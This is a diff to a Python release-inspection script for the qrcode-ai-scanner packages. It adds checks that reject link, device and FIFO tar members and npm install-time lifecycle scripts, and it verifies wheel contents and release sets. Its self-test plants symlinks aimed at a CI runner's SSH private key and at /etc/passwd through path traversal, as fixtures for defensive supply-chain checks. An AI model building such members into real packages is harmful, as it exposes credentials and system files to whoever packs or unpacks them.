@@ -5,11 +5,15 @@ Each target is packed or built locally the way its publish job does it, and
 the resulting archive is read back: the AGPL LICENSE text (byte-identical to
 the root copy, where PEP 639 says it is for Python), the README, the type
 files, the version strings, the file set, and the absence of private or stray
-files. The file set is exact for npm packages and wheels; a .crate or an sdist
+files. The file set is exact for npm packages and wheels (a Linux wheel may
+add the libraries auditwheel grafts, listed in RECORD); a .crate or an sdist
 may only hold files git tracks in the directories it packs, plus what cargo
-and maturin generate. Nothing is ever uploaded: packing goes through `cargo
-package`, `npm pack --pack-destination`, scripts/build-wasm.sh (wasm-pack),
-maturin and `pub publish --dry-run`.
+and maturin generate. A tar member that is not a regular file or a directory
+fails. The npm main package ships the committed loader, JavaScript and
+manifest (napi adds only the pins) and no install-time script; the wasm and
+platform packages carry no scripts at all. Nothing is ever uploaded: packing
+goes through `cargo package`, `npm pack --pack-destination`,
+scripts/build-wasm.sh (wasm-pack), maturin and `pub publish --dry-run`.
 
   package-inspect.py all [--no-build]          every target this host can run
   package-inspect.py crates [--verify]         the .crate of each published crate
@@ -27,8 +31,10 @@ Common options: --out DIR (JSON + Markdown receipt and command logs; the
 Markdown also lands in $GITHUB_STEP_SUMMARY when that is set) · --strict
 (UNAVAILABLE fails too: CI, where every tool must exist) · --cargo-wrapper
 PATH (run cargo as `PATH cargo ...`) · --allow-dirty (passed to cargo) ·
---release-set (node · archive: the npm set about to publish, where the main
-package pins every napi target and each pin has its platform package).
+--release-set (node · archive: the set about to publish, complete and
+nothing else — npm: the main package pins every napi target and each pin has
+its platform package; Python: one wheel per row of python.yml's wheels
+matrix and one sdist).
 
 Verdicts: PASS · FAIL · UNAVAILABLE (a tool or input this host lacks, named,
 never a pass) · BLOCKED (a known structural blocker that packaging metadata
@@ -130,6 +136,24 @@ SDIST_CRATES = {"qrcode-ai-scanner-py/": "crates/qrcode-ai-scanner-py",
 # compared every platform package against '0.8.1'.
 LOADER_LITERAL = re.compile(r"!== '\d+\.\d+\.\d+'|expected \d+\.\d+\.\d+ but got")
 LOADER_RUNTIME_READ = "require('./package.json')"
+# The lifecycle scripts npm runs on a consumer's install (prepare: from git).
+INSTALL_SCRIPTS = frozenset({"preinstall", "install", "postinstall", "prepare"})
+
+# python.yml › wheels builds one wheel per row of its matrix; PyPI receives
+# exactly one wheel per row (each of its platform tags in that row's family)
+# and the sdist. A row added there is added here, or the release fails.
+WHEEL_PLATFORMS = (
+    ("manylinux x86_64", re.compile(r"manylinux(_\d+_\d+|\d+)_x86_64")),
+    ("manylinux aarch64", re.compile(r"manylinux(_\d+_\d+|\d+)_aarch64")),
+    ("musllinux x86_64", re.compile(r"musllinux_\d+_\d+_x86_64")),
+    ("macOS x86_64", re.compile(r"macosx_\d+_\d+_x86_64")),
+    ("macOS arm64", re.compile(r"macosx_\d+_\d+_arm64")),
+    ("Windows x64", re.compile(r"win_amd64")),
+)
+# What auditwheel grafts into a manylinux / musllinux wheel: the shared
+# libraries the extension links against, renamed with a hash of their bytes
+# (the musllinux wheel carries libgcc_s-<hash>.so.1).
+GRAFTED_LIB = re.compile(r"qrcode_ai_scanner\.libs/[^/]+-[0-9a-f]{8}\.so(\.\d+)*")
 
 PASS, FAIL, UNAVAILABLE, BLOCKED = "pass", "fail", "unavailable", "blocked"
 
@@ -246,18 +270,36 @@ def which(tool: str):
 # ---------------------------------------------------------------- archives
 
 
+_TAR_KINDS = {tarfile.SYMTYPE: "symlink", tarfile.LNKTYPE: "hard link", tarfile.CHRTYPE: "character device",
+              tarfile.BLKTYPE: "block device", tarfile.FIFOTYPE: "FIFO"}
+
+
 def read_tar(path: pathlib.Path):
-    """Regular files of a tar(.gz) archive → ({path below the top dir: bytes}, top dir)."""
-    files, tops = {}, set()
+    """A tar(.gz) archive → ({path below the top dir: bytes}, top dir, special members).
+
+    Only regular files reach the dict. Any member that is neither a regular
+    file nor a directory (a symlink, a hard link, a device, a FIFO) is listed
+    in SPECIAL: no packer here writes one, and the file-set and stray checks
+    would never see what it points to.
+    """
+    files, tops, special = {}, set(), []
     with tarfile.open(path) as archive:
         for member in archive.getmembers():
-            if not member.isfile():
-                continue
             top, _, inner = member.name.partition("/")
+            if member.isdir():
+                continue
             tops.add(top)
+            if not member.isfile():
+                special.append(f"{inner or member.name} ({_TAR_KINDS.get(member.type, f'type {member.type!r}')})")
+                continue
             handle = archive.extractfile(member)
             files[inner] = handle.read() if handle else b""
-    return files, (tops.pop() if len(tops) == 1 else "|".join(sorted(tops)))
+    return files, (tops.pop() if len(tops) == 1 else "|".join(sorted(tops))), special
+
+
+def check_members(art: Artifact, special: list) -> None:
+    art.check("only regular files and directories (no link, device or FIFO member)", not special,
+              "; ".join(special))
 
 
 def read_zip(path: pathlib.Path) -> dict:
@@ -365,10 +407,11 @@ def check_equal_file(art: Artifact, name: str, data, source: pathlib.Path) -> No
 
 
 def inspect_crate(host: Host, path: pathlib.Path, notes=()) -> Artifact:
-    files, top = read_tar(path)
+    files, top, special = read_tar(path)
     art = host.add(Artifact(f"crate {top}", "crate"))
     art.notes.extend(notes)
     describe(art, path, files)
+    check_members(art, special)
     manifest = tomllib.loads(files.get("Cargo.toml", b"").decode() or "")
     package = manifest.get("package", {})
     name = package.get("name") or top.rsplit("-", 1)[0]
@@ -447,13 +490,14 @@ def npm_pack(host: Host, label: str, pkg_dir: pathlib.Path):
 
 
 def inspect_npm(host: Host, path: pathlib.Path, notes=()) -> Artifact:
-    files, _top = read_tar(path)
+    files, _top, special = read_tar(path)
     pkg = json.loads(files.get("package.json", b"{}"))
     name = pkg.get("name", "?")
     art = host.add(Artifact(f"npm {name}@{pkg.get('version')}", "npm"))
     art.notes.extend(notes)
     art.package = {key: pkg.get(key) for key in ("name", "version", "optionalDependencies")}
     describe(art, path, files)
+    check_members(art, special)
     art.check(f"version = {host.version} (workspace)", pkg.get("version") == host.version,
               f"package.json version {pkg.get('version')}")
     art.check(f"license = {SPDX}", pkg.get("license") == SPDX, f"{pkg.get('license')}")
@@ -462,24 +506,42 @@ def inspect_npm(host: Host, path: pathlib.Path, notes=()) -> Artifact:
               json.dumps(pkg.get("repository")))
     check_license(art, files.get("LICENSE"), "package/LICENSE")
     check_stray(art, files)
+    scripts = pkg.get("scripts") or {}
     if name == NODE_NAME:
         check_exact_set(art, files, NODE_FILES, "main-package allowlist")
-        native = files.get("native.js", b"").decode()
+        native = files.get("native.js", b"").decode(errors="replace")
         literal = LOADER_LITERAL.search(native)
         art.check("loader enforces the package's own version (no literal)",
                   not literal and LOADER_RUNTIME_READ in native,
                   f"literal {literal.group(0)!r}" if literal else f"reads {LOADER_RUNTIME_READ}")
         check_equal_file(art, "report-types.d.ts", files.get("report-types.d.ts"), CANON_TYPES)
         check_equal_file(art, "README.md", files.get("README.md"), NODE_DIR / "README.md")
-        for dts in ("index.d.ts", "native.d.ts"):
-            check_equal_file(art, dts, files.get(dts), NODE_DIR / dts)
+        # Every file a consumer's `require` runs or reads is the committed one,
+        # byte for byte: in publish-native the tree is the tag's fresh checkout.
+        for source in ("index.js", "native.js", "index.d.ts", "native.d.ts"):
+            check_equal_file(art, source, files.get(source), NODE_DIR / source)
+        # The manifest is the committed one: `napi pre-publish` adds only the pins.
+        committed = json.loads((NODE_DIR / "package.json").read_text())
+        differ = sorted(key for key in {*pkg, *committed} - {"optionalDependencies"}
+                        if pkg.get(key) != committed.get(key))
+        art.check("package.json is the committed manifest (napi pre-publish adds only optionalDependencies)",
+                  not differ, f"differs in: {', '.join(differ)}" if differ else "")
+        on_install = sorted(set(scripts) & INSTALL_SCRIPTS)
+        art.check("no install-time lifecycle script (preinstall · install · postinstall · prepare)",
+                  not on_install, ", ".join(on_install))
         # `napi pre-publish` pins every napi target at the package version: the
         # loader can only find a binary through those pins. The committed
         # manifest carries none (a dev build); a release set must carry all.
         optional = pkg.get("optionalDependencies")
         if optional is not None or host.args.release_set:
             check_pins(art, optional or {}, pkg)
-    elif name == WASM_NAME:
+        return art
+    if name == WASM_NAME or name.startswith(NODE_NAME + "-"):
+        # Generated manifests (wasm-pack, napi create-npm-dirs) carry no
+        # scripts: any is planted, and some would run on a consumer's install.
+        art.check("no lifecycle scripts (`scripts` absent)", not scripts,
+                  f"scripts: {', '.join(sorted(scripts))}" if scripts else "")
+    if name == WASM_NAME:
         check_exact_set(art, files, WASM_FILES, "wasm-pack output + patch allowlist")
         check_equal_file(art, "report-types.d.ts", files.get("report-types.d.ts"), CANON_TYPES)
         dts = files.get("qrcode-ai-scanner.d.ts", b"").decode()
@@ -514,8 +576,55 @@ def check_pins(art: Artifact, optional: dict, pkg: dict) -> None:
               bool(want) and not problems, "; ".join(problems) or f"{len(want)} pins")
 
 
+def wheel_tags(filename: str) -> set:
+    """The python-abi-platform tags a wheel file name stands for (PEP 427: dotted = a set)."""
+    parts = filename.removesuffix(".whl").split("-")
+    if len(parts) not in (5, 6):
+        return set()
+    pythons, abis, platforms = (part.split(".") for part in parts[-3:])
+    return {f"{p}-{a}-{q}" for p in pythons for a in abis for q in platforms}
+
+
+def check_pypi_release_set(host: Host) -> None:
+    """--release-set over Python archives: exactly what python › release uploads."""
+    names = sorted(a.package.get("filename", "") for a in host.artifacts if a.kind in ("wheel", "sdist"))
+    art = host.add(Artifact("PyPI release set", "pypi"))
+    art.listing = names
+    problems = []
+    sdists = [n for n in names if n.endswith(".tar.gz")]
+    if sdists != [f"qrcode_ai_scanner-{host.version}.tar.gz"]:
+        problems.append(f"want one sdist qrcode_ai_scanner-{host.version}.tar.gz, got {sdists or 'none'}")
+    rows: dict = {label: [] for label, _pattern in WHEEL_PLATFORMS}
+    for name in (n for n in names if n.endswith(".whl")):
+        if not name.startswith(f"qrcode_ai_scanner-{host.version}-"):
+            problems.append(f"{name} is not version {host.version}")
+        platforms = {tag.rsplit("-", 1)[1] for tag in wheel_tags(name)}
+        found = [label for label, pattern in WHEEL_PLATFORMS
+                 if platforms and all(pattern.fullmatch(p) for p in platforms)]
+        if found:
+            rows[found[0]].append(name)
+        else:
+            problems.append(f"{name} is no row of python.yml's wheels matrix")
+    problems += [f"no {label} wheel" for label, wheels in rows.items() if not wheels]
+    problems += [f"{len(wheels)} {label} wheels: {', '.join(wheels)}" for label, wheels in rows.items()
+                 if len(wheels) > 1]
+    art.check(f"one wheel per row of python.yml's matrix ({len(WHEEL_PLATFORMS)}) and one sdist, "
+              f"all at {host.version}, nothing else", not problems, "; ".join(problems))
+
+
 def check_release_set(host: Host) -> None:
-    """--release-set: one main package, and exactly one platform package per pin."""
+    """--release-set: the set about to publish is complete and holds nothing else."""
+    kinds = {a.kind for a in host.artifacts}
+    if "npm" in kinds:
+        check_npm_release_set(host)
+    if kinds & {"wheel", "sdist"}:
+        check_pypi_release_set(host)
+    if not kinds & {"npm", "wheel", "sdist"}:
+        host.add(Artifact("release set", "archive")).check("npm or Python archives given", False, ", ".join(kinds))
+
+
+def check_npm_release_set(host: Host) -> None:
+    """--release-set over npm archives: one main package, exactly one platform package per pin."""
     npm = [a for a in host.artifacts if a.kind == "npm" and a.package.get("name")]
     mains = [a for a in npm if a.package["name"] == NODE_NAME]
     art = host.add(Artifact("npm release set", "npm"))
@@ -621,7 +730,7 @@ def cmd_node(host: Host) -> None:
             else:
                 inspect_npm(host, tarball, notes=["napi create-npm-dirs + napi artifacts output"])
         if host.args.release_set:
-            check_release_set(host)
+            check_npm_release_set(host)
         return
     if host.args.release_set:
         host.add(Artifact("npm release set", "npm")).check("--platform-dirs given", False,
@@ -692,6 +801,7 @@ def inspect_wheel(host: Host, path: pathlib.Path, notes=()) -> Artifact:
     files = read_zip(path)
     art = host.add(Artifact(f"wheel {path.name}", "wheel"))
     art.notes.extend(notes)
+    art.package = {"filename": path.name}
     describe(art, path, files)
     dist_info = sorted({n.split("/", 1)[0] for n in files if re.match(r"[^/]+\.dist-info/METADATA$", n)})
     if not art.check("one .dist-info/METADATA", len(dist_info) == 1, ", ".join(dist_info)):
@@ -699,6 +809,12 @@ def inspect_wheel(host: Host, path: pathlib.Path, notes=()) -> Artifact:
     info = dist_info[0]
     meta = metadata(files[f"{info}/METADATA"])
     check_python_metadata(art, host, meta)
+    # The platform the next checks rely on is the one pip installs by (the
+    # file name), and the WHEEL metadata must say the same.
+    tags = {line.split(":", 1)[1].strip() for line in files.get(f"{info}/WHEEL", b"").decode().splitlines()
+            if line.startswith("Tag:")}
+    art.check("WHEEL tags are the file name's", bool(tags) and tags == wheel_tags(path.name),
+              f"WHEEL {sorted(tags)} · file name {sorted(wheel_tags(path.name))}")
     # PEP 639: each License-File value names a file under .dist-info/licenses/.
     for value in meta.get_all("License-File") or ["LICENSE"]:
         check_license(art, files.get(f"{info}/licenses/{value}"), f"{info}/licenses/{value} (License-File {value})")
@@ -706,6 +822,18 @@ def inspect_wheel(host: Host, path: pathlib.Path, notes=()) -> Artifact:
         art.check(f"{typed} present (type stubs)", typed in files)
     modules = [n for n in files if re.match(r"qrcode_ai_scanner/qrcode_ai_scanner\.[^/]*(so|pyd)$", n)]
     art.check("exactly one compiled extension module", len(modules) == 1, ", ".join(modules))
+    # auditwheel's grafts, and nothing else, under qrcode_ai_scanner.libs/: only
+    # in a Linux wheel it repaired, each named <name>-<8 hex>.so[.N] and listed
+    # in RECORD like every file maturin wrote.
+    linux = bool(tags) and all(t.rsplit("-", 1)[1].startswith(("manylinux", "musllinux")) for t in tags)
+    record = {row.split(",", 1)[0] for row in files.get(f"{info}/RECORD", b"").decode().splitlines()}
+    libs = sorted(n for n in files if n.startswith("qrcode_ai_scanner.libs/"))
+    bad = [f"{n}: not a manylinux or musllinux wheel" for n in libs if not linux]
+    bad += [f"{n}: not <name>-<8 hex>.so[.N]" for n in libs if not GRAFTED_LIB.fullmatch(n)]
+    bad += [f"{n}: not listed in RECORD" for n in libs if n not in record]
+    if libs:
+        art.check("qrcode_ai_scanner.libs/ holds only auditwheel grafts (Linux wheel · <name>-<8 hex>.so[.N] · "
+                  "in RECORD)", not bad, "; ".join(bad))
     # The whole wheel, exactly: the dist-info maturin writes, the license
     # files, the SBOM, and the package (init · stubs · marker · extension).
     exact = {f"{info}/{n}" for n in ("METADATA", "WHEEL", "RECORD")} | {
@@ -713,18 +841,20 @@ def inspect_wheel(host: Host, path: pathlib.Path, notes=()) -> Artifact:
         f"qrcode_ai_scanner/{n}" for n in ("__init__.py", "__init__.pyi", "py.typed")}
     patterns = (re.compile(rf"{re.escape(info)}/sboms/[^/]+\.cyclonedx\.json"),
                 re.compile(r"qrcode_ai_scanner/qrcode_ai_scanner(\.[^/]+)?\.(so|pyd)"))
-    extra = sorted(n for n in files if n not in exact and not any(p.fullmatch(n) for p in patterns))
-    art.check("file set is exactly the wheel allowlist (dist-info · licenses · sbom · package)", not extra,
+    extra = sorted(n for n in files if n not in exact and n not in libs and not any(p.fullmatch(n) for p in patterns))
+    art.check("file set is exactly the wheel allowlist (dist-info · licenses · sbom · package · grafts)", not extra,
               f"unexpected: {', '.join(extra)}" if extra else "")
     check_stray(art, files)
     return art
 
 
 def inspect_sdist(host: Host, path: pathlib.Path, notes=()) -> Artifact:
-    files, top = read_tar(path)
+    files, top, special = read_tar(path)
     art = host.add(Artifact(f"sdist {path.name}", "sdist"))
     art.notes.extend(notes)
+    art.package = {"filename": path.name}
     describe(art, path, files)
+    check_members(art, special)
     art.check(f"archive root is qrcode_ai_scanner-{host.version}", top == f"qrcode_ai_scanner-{host.version}", top)
     meta = metadata(files["PKG-INFO"]) if "PKG-INFO" in files else None
     if meta is not None:
@@ -1070,12 +1200,17 @@ PLANTED = (
 REPO_URL = {"type": "git", "url": "https://github.com/supernovae-st/qrcode-ai-scanner"}
 
 
-def _tar(path: pathlib.Path, top: str, files: dict) -> pathlib.Path:
+def _tar(path: pathlib.Path, top: str, files: dict, members=None) -> pathlib.Path:
+    """FILES under TOP as regular files; MEMBERS adds {name: (tar type, link target)}."""
     with tarfile.open(path, "w:gz") as archive:
         for name, data in sorted(files.items()):
             info = tarfile.TarInfo(f"{top}/{name}")
             info.size = len(data)
             archive.addfile(info, io.BytesIO(data))
+        for name, (kind, target) in sorted((members or {}).items()):
+            info = tarfile.TarInfo(f"{top}/{name}")
+            info.type, info.linkname = kind, target
+            archive.addfile(info)
     return path
 
 
@@ -1102,15 +1237,26 @@ def _python_metadata(version: str) -> bytes:
             f"License-Expression: {SPDX}\nLicense-File: LICENSE\n").encode()
 
 
-def _clean_wheel(version: str) -> dict:
+def _clean_wheel(version: str, platform: str = "manylinux_2_17_x86_64", python: str = "cp38-abi3") -> dict:
+    """A wheel's files as maturin writes them, tagged PYTHON-PLATFORM (dotted = several tags)."""
     info = f"qrcode_ai_scanner-{version}.dist-info"
-    return {
-        f"{info}/METADATA": _python_metadata(version), f"{info}/WHEEL": b"Wheel-Version: 1.0\n",
-        f"{info}/RECORD": b"", f"{info}/licenses/LICENSE": LICENSE.read_bytes(),
+    tags = "".join(f"Tag: {python}-{tag}\n" for tag in platform.split("."))
+    files = {
+        f"{info}/METADATA": _python_metadata(version),
+        f"{info}/WHEEL": f"Wheel-Version: 1.0\nRoot-Is-Purelib: false\n{tags}".encode(),
+        f"{info}/licenses/LICENSE": LICENSE.read_bytes(),
         f"{info}/sboms/qrcode-ai-scanner-py.cyclonedx.json": b"{}\n",
         "qrcode_ai_scanner/__init__.py": b"", "qrcode_ai_scanner/__init__.pyi": b"",
         "qrcode_ai_scanner/py.typed": b"", "qrcode_ai_scanner/qrcode_ai_scanner.abi3.so": b"\x7fELF",
     }
+    return _with_record(files, version)
+
+
+def _with_record(files: dict, version: str, *unlisted: str) -> dict:
+    """FILES with a RECORD naming every entry but UNLISTED (no hashes: never verified)."""
+    record = f"qrcode_ai_scanner-{version}.dist-info/RECORD"
+    names = sorted(n for n in files if n != record and n not in unlisted)
+    return files | {record: "".join(f"{n},,\n" for n in [*names, record]).encode()}
 
 
 def _clean_sdist(version: str) -> dict:
@@ -1145,6 +1291,34 @@ def _npm_platform(version: str, suffix: str) -> dict:
             "LICENSE": LICENSE.read_bytes(), binary: b"\x7fELF"}
 
 
+def _npm_wasm(version: str) -> dict:
+    """The wasm package as build-wasm.sh leaves pkg/: wasm-pack output, patched."""
+    pkg = {"name": WASM_NAME, "type": "module", "version": version, "license": SPDX, "repository": REPO_URL,
+           "files": ["qrcode-ai-scanner_bg.wasm", "qrcode-ai-scanner.js", "qrcode-ai-scanner.d.ts",
+                     "report-types.d.ts", "LICENSE"],
+           "main": "qrcode-ai-scanner.js", "types": "qrcode-ai-scanner.d.ts"}
+    dts = ('export * from "./report-types";\n'
+           "export function scan_frame(data: Uint8Array, width: number, height: number): ScanReport;\n"
+           "export function scan_image(bytes: Uint8Array): ScanReport;\n")
+    return {"package.json": json.dumps(pkg, indent=2).encode(), "README.md": (WASM_DIR / "README.md").read_bytes(),
+            "LICENSE": LICENSE.read_bytes(), "qrcode-ai-scanner.js": b"export {};\n",
+            "qrcode-ai-scanner.d.ts": dts.encode(), "qrcode-ai-scanner_bg.wasm": b"\0asm\1\0\0\0",
+            "report-types.d.ts": CANON_TYPES.read_bytes()}
+
+
+def _with_scripts(files: dict, **scripts: str) -> dict:
+    """An npm package's FILES whose package.json gains SCRIPTS."""
+    pkg = json.loads(files["package.json"])
+    pkg["scripts"] = dict(pkg.get("scripts") or {}, **scripts)
+    return files | {"package.json": json.dumps(pkg, indent=2).encode()}
+
+
+# python.yml › wheels builds one wheel per row, each tagged like these (the
+# 0.9.0 names); the PyPI release set holds exactly one per row plus the sdist.
+SELFTEST_PLATFORMS = ("manylinux_2_17_x86_64.manylinux2014_x86_64", "manylinux_2_17_aarch64.manylinux2014_aarch64",
+                      "musllinux_1_2_x86_64", "macosx_10_12_x86_64", "macosx_11_0_arm64", "win_amd64")
+
+
 def self_test() -> int:
     """Synthetic archives with one known defect each, judged by `archive`."""
     version = workspace_version()
@@ -1173,28 +1347,34 @@ def self_test() -> int:
                                 + (f", no failing check names {missing}" if missing else "")
                                 + (f" — failing: {failed}" if failed else ""))
 
-        def crate(name: str, files: dict) -> pathlib.Path:
-            return _tar(base / f"{name}.crate", f"qrcode-ai-scanner-{version}", files)
+        def place(name: str, filename: str) -> pathlib.Path:
+            (base / name).mkdir(parents=True, exist_ok=True)
+            return base / name / filename
 
-        def wheel(name: str, files: dict) -> pathlib.Path:
-            return _zip(base / name / f"qrcode_ai_scanner-{version}-cp38-abi3-manylinux_2_17_x86_64.whl", files)
+        def crate(name: str, files: dict, members=None) -> pathlib.Path:
+            return _tar(place(name, f"qrcode-ai-scanner-{version}.crate"), f"qrcode-ai-scanner-{version}", files,
+                        members)
 
-        def sdist(name: str, files: dict) -> pathlib.Path:
-            return _tar(base / name / f"qrcode_ai_scanner-{version}.tar.gz", f"qrcode_ai_scanner-{version}", files)
+        def wheel(name: str, files: dict, platform: str = "manylinux_2_17_x86_64",
+                  python: str = "cp38-abi3") -> pathlib.Path:
+            return _zip(place(name, f"qrcode_ai_scanner-{version}-{python}-{platform}.whl"), files)
 
-        def npm(name: str, files: dict) -> pathlib.Path:
+        def sdist(name: str, files: dict, members=None) -> pathlib.Path:
+            return _tar(place(name, f"qrcode_ai_scanner-{version}.tar.gz"), f"qrcode_ai_scanner-{version}", files,
+                        members)
+
+        def npm(name: str, files: dict, members=None) -> pathlib.Path:
             pkg = json.loads(files["package.json"])
-            return _tar(base / name / f"{pkg['name'].lstrip('@').replace('/', '-')}-{version}.tgz", "package",
-                        files)
+            return _tar(place(name, f"{pkg['name'].lstrip('@').replace('/', '-')}-{version}.tgz"), "package",
+                        files, members)
 
-        for label in ("crate", "wheel", "sdist"):
-            (base / label).mkdir()
-        (base / "platform").mkdir()
         # The clean archives pass: every negative below fails for its plant.
         judge("clean crate", [crate("clean", _clean_crate(version))], PASS)
         judge("clean wheel", [wheel("wheel", _clean_wheel(version))], PASS)
         judge("clean sdist", [sdist("sdist", _clean_sdist(version))], PASS)
         judge("clean platform package", [npm("platform", _npm_platform(version, "linux-x64-gnu"))], PASS)
+        judge("clean main package", [npm("main", _npm_main(version))], PASS)
+        judge("clean wasm package", [npm("wasm", _npm_wasm(version))], PASS)
 
         for i, planted in enumerate(PLANTED):
             ran += 1
@@ -1202,15 +1382,12 @@ def self_test() -> int:
                 failures.append(f"denylist: {planted!r} matches no STRAY pattern")
             judge(f"crate + {planted}", [crate(f"stray-{i}", _clean_crate(version) | {planted: b"x"})],
                   FAIL, planted)
-            (base / f"wheel-{i}").mkdir()
             judge(f"wheel + qrcode_ai_scanner/{planted}",
                   [wheel(f"wheel-{i}", _clean_wheel(version) | {f"qrcode_ai_scanner/{planted}": b"x"})],
                   FAIL, planted)
-            (base / f"sdist-{i}").mkdir()
             judge(f"sdist + qrcode-ai-scanner-py/{planted}",
                   [sdist(f"sdist-{i}", _clean_sdist(version) | {f"qrcode-ai-scanner-py/{planted}": b"x"})],
                   FAIL, planted)
-            (base / f"platform-{i}").mkdir()
             judge(f"platform package + {planted}",
                   [npm(f"platform-{i}", _npm_platform(version, "linux-x64-gnu") | {planted: b"x"})],
                   FAIL, planted)
@@ -1218,33 +1395,114 @@ def self_test() -> int:
         # Untracked but innocuous files: the git allowlist alone must catch them.
         judge("crate + an untracked source file", [crate("untracked", _clean_crate(version) | {"src/scratch.rs": b""})],
               FAIL, "src/scratch.rs")
-        (base / "wheel-extra").mkdir()
         judge("wheel + a file outside the wheel allowlist",
               [wheel("wheel-extra", _clean_wheel(version) | {"qrcode_ai_scanner/notes.txt": b""})],
               FAIL, "qrcode_ai_scanner/notes.txt")
-        (base / "sdist-extra").mkdir()
         judge("sdist + an untracked core file",
               [sdist("sdist-extra", _clean_sdist(version) | {"qrcode-ai-scanner/src/extra.rs": b""})],
               FAIL, "qrcode-ai-scanner/src/extra.rs")
 
+        # A tar member that is neither a regular file nor a directory never
+        # reaches the file-set checks: it fails by itself, whatever its name.
+        judge("crate with directory members", [crate("dirs", _clean_crate(version), {
+            "src": (tarfile.DIRTYPE, "")})], PASS)
+        judge("crate + a symlink member", [crate("symlink", _clean_crate(version), {
+            ".ssh/id_rsa": (tarfile.SYMTYPE, "/home/runner/.ssh/id_rsa")})], FAIL, ".ssh/id_rsa (symlink)")
+        judge("crate + a hard-link member", [crate("hardlink", _clean_crate(version), {
+            "src/main.rs": (tarfile.LNKTYPE, "qrcode-ai-scanner-0.0.0/src/lib.rs")})], FAIL, "src/main.rs (hard link)")
+        judge("sdist + a symlink member", [sdist("sdist-symlink", _clean_sdist(version), {
+            "qrcode-ai-scanner-py/src/data.rs": (tarfile.SYMTYPE, "../../../../etc/passwd")})], FAIL, "(symlink)")
+        judge("platform package + a FIFO member", [npm("platform-fifo", _npm_platform(version, "linux-x64-gnu"), {
+            "pipe": (tarfile.FIFOTYPE, "")})], FAIL, "pipe (FIFO)")
+
         # The AGPL text where PEP 639 says it is, byte for byte.
-        (base / "wheel-crlf").mkdir()
         judge("win wheel with a CRLF LICENSE",
               [wheel("wheel-crlf", _clean_wheel(version) | {
                   f"qrcode_ai_scanner-{version}.dist-info/licenses/LICENSE": crlf})], FAIL, "LICENSE")
         no_root = {k: v for k, v in _clean_sdist(version).items() if k != "LICENSE"}
-        (base / "sdist-py-license-only").mkdir()
         judge("sdist with the AGPL text only under qrcode-ai-scanner-py/",
               [sdist("sdist-py-license-only", no_root)], FAIL, "License-File")
-        (base / "sdist-crlf").mkdir()
         judge("sdist whose License-File is a CRLF copy",
               [sdist("sdist-crlf", _clean_sdist(version) | {"LICENSE": crlf})], FAIL, "License-File")
         globbed = _clean_sdist(version)
         globbed["pyproject.toml"] = globbed["pyproject.toml"].replace(b'license-files = ["LICENSE"]',
                                                                       b'license-files = ["LICENSES/*.txt"]')
-        (base / "sdist-glob").mkdir()
         judge("sdist whose pyproject license-files matches nothing", [sdist("sdist-glob", globbed)],
               FAIL, "license-files")
+
+        # auditwheel grafts the shared libraries a Linux wheel links against
+        # into qrcode_ai_scanner.libs/ (musllinux: libgcc_s), named with a hash
+        # and listed in RECORD. Nothing else may sit there.
+        lib = "qrcode_ai_scanner.libs/libgcc_s-f685abf1.so.1"
+        musl = _clean_wheel(version, "musllinux_1_2_x86_64")
+        judge("musllinux wheel + its grafted libgcc_s, listed in RECORD",
+              [wheel("libs-musl", _with_record(musl | {lib: b"\x7fELF"}, version), "musllinux_1_2_x86_64")], PASS)
+        judge("manylinux wheel + a grafted library, listed in RECORD",
+              [wheel("libs-many", _with_record(_clean_wheel(version) | {
+                  "qrcode_ai_scanner.libs/libz-eb09ad1d.so.1.2.13": b"\x7fELF"}, version))], PASS)
+        judge("musllinux wheel + a grafted library missing from RECORD",
+              [wheel("libs-unrecorded", _with_record(musl | {lib: b"\x7fELF"}, version, lib),
+                     "musllinux_1_2_x86_64")], FAIL, f"{lib}: not listed in RECORD")
+        mac = _clean_wheel(version, "macosx_11_0_arm64")
+        judge("macOS wheel + a .libs/ library",
+              [wheel("libs-mac", _with_record(mac | {lib: b"\x7fELF"}, version), "macosx_11_0_arm64")],
+              FAIL, f"{lib}: not a manylinux or musllinux wheel")
+        win = _clean_wheel(version, "win_amd64")
+        judge("Windows wheel + a .libs/ library",
+              [wheel("libs-win", _with_record(win | {lib: b"MZ"}, version), "win_amd64")],
+              FAIL, f"{lib}: not a manylinux or musllinux wheel")
+        for name in ("qrcode_ai_scanner.libs/libgcc_s-f685abf1.dylib", "qrcode_ai_scanner.libs/libgcc_s.so.1",
+                     "qrcode_ai_scanner.libs/hook-0123abcd.py", "qrcode_ai_scanner.libs/x/libz-eb09ad1d.so"):
+            slug = re.sub(r"[^a-z0-9]+", "-", name.rsplit("/", 1)[-1])
+            judge(f"musllinux wheel + {name}",
+                  [wheel(f"libs-{slug}", _with_record(musl | {name: b"\x7fELF"}, version), "musllinux_1_2_x86_64")],
+                  FAIL, f"{name}: not <name>-<8 hex>.so[.N]")
+        judge("wheel whose WHEEL tags are not its file name's",
+              [wheel("tags", _clean_wheel(version, "musllinux_1_2_x86_64"))], FAIL, "WHEEL")
+
+        # PyPI receives exactly one wheel per row of python.yml's matrix and
+        # the sdist: an artifact any job of the run added never rides along.
+        pypi = [wheel(f"pypi-{i}", _clean_wheel(version, platform), platform)
+                for i, platform in enumerate(SELFTEST_PLATFORMS)]
+        pypi_sdist = sdist("pypi-sdist", _clean_sdist(version))
+        judge("PyPI set: one wheel per matrix row + the sdist", [*pypi, pypi_sdist], PASS, release_set=True)
+        judge("PyPI set: the Windows wheel missing", [*pypi[:-1], pypi_sdist], FAIL, "no Windows x64 wheel",
+              release_set=True)
+        judge("PyPI set: the sdist missing", [*pypi], FAIL, "sdist", release_set=True)
+        judge("PyPI set: an extra py3-none-any wheel",
+              [*pypi, pypi_sdist, wheel("pypi-any", _clean_wheel(version, "any", "py3-none"), "any", "py3-none")],
+              FAIL, "py3-none-any", release_set=True)
+        judge("PyPI set: a second macOS arm64 wheel",
+              [*pypi, pypi_sdist, wheel("pypi-mac14", _clean_wheel(version, "macosx_14_0_arm64"), "macosx_14_0_arm64")],
+              FAIL, "macOS arm64", release_set=True)
+
+        # Lifecycle scripts: npm runs them on install (and on a directory
+        # publish), never in a tarball we inspected. The main package keeps its
+        # committed build/test/prepack scripts and nothing that runs on install.
+        for script in ("preinstall", "install", "postinstall", "prepare"):
+            judge(f"main + a {script} script", [npm(f"main-{script}", _with_scripts(_npm_main(version), **{
+                script: "node -e 1"}))], FAIL, script)
+        judge("wasm + prepublishOnly and postinstall scripts",
+              [npm("wasm-scripts", _with_scripts(_npm_wasm(version), prepublishOnly="sh x", postinstall="sh y"))],
+              FAIL, "prepublishOnly")
+        judge("wasm + a harmless-looking test script",
+              [npm("wasm-test", _with_scripts(_npm_wasm(version), test="node test.mjs"))], FAIL, "scripts")
